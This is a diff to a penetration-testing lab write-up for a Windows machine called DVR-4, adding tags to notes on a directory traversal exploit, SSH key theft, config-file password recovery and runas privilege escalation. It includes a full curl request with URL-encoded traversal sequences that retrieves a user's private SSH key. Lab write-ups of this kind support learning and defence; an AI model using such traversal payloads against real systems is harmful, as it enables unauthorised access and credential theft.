@@ -3,7 +3,7 @@ Alias: DVR-4
 Date: 8/21/2022
 Platform: Windows
 Difficulty: Intermediate
-Tags: #WindowsDirectoryTraversalExploit #URLencodedCharacters #WindowsDirectoryTraversalPrivateSSHKey #FindHiddenWindowsDirectorys #WindowsProgramConfigurationFile #IdentifyHashID #RunProgramFromDifferentWindowsUser 
+Tags: #WindowsDirectoryTraversalExploit #URLencodedCharacters #WindowsDirectoryTraversalPrivateSSHKey #FindHiddenWindowsDirectorys #WindowsProgramConfigurationFile #IdentifyHashID #RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
 Status: Finished
 IP: 192.168.122.179
 ---
@@ -213,6 +213,7 @@ Enumerated top 200 UDP ports:
 #### - Typed "searchsploit -m windows_x86/webapps/45296.txt" and found the following ouput showing a directory Traversal exploit:
 
 ![](Pasted%20image%2020221009190910.png)
+#WindowsDirectoryTraversalExploit
 
 #### - Googled "url encoded characters" and found the following webpage showing character "." will be used as %2E and character "/" used as %2F:
 
@@ -221,11 +222,12 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221009191245.png)
 
 ![](Pasted%20image%2020221009191343.png)
-
+#URLencodedCharacters
 
 #### - Typed the following on kali machine to retreive private ssh key for the found user "viewer" found previously "curl "http://[Kali IP]:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa"
 
 ![](Pasted%20image%2020221009191611.png)
+#WindowsDirectoryTraversalPrivateSSHKey
 
 #### - Typed "cat id_rsa" and found the following private ssh key:
 
@@ -267,6 +269,7 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor
 #### - Typed "dir /a" in the C: directory to find any hidden directorys/files and found hidden directory "ProgramData"
 
 ![](Pasted%20image%2020221009192857.png)
+#FindHiddenWindowsDirectorys
 
 #### - Changed to directory "ProgramData" and foud the following directorys. I then navigated into the "PY_Software" directory:
 
@@ -279,6 +282,7 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor
 #### - I then found the DVRParams (.ini) configuration file:
 
 ![](Pasted%20image%2020221009194221.png)
+#WindowsProgramConfigurationFile 
 
 #### - I then typed "type DVRParams.ini" to read the contents of the configuration file and found the following "adminstrator" user and hashed or encrypted password "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8":
 ![](Pasted%20image%2020221009201025.png)
@@ -286,6 +290,7 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor
 #### - Attempted to type "hashid ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8" to identify the hash but received an Uknown hash:
 
 ![](Pasted%20image%2020221009201200.png)
+	#IdentifyHashID
 
 #### - Remembered the "Weak password encryption" exploit/script found earlier. Typed "vim 50130.py" and input the encrypted password into the script:
 
@@ -320,7 +325,7 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor
 ![](Pasted%20image%2020221009202604.png)
 
 
-#RunProgramFromDifferentWindowsUser 
+#RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
 
 
 ## Privilege Escalation vector
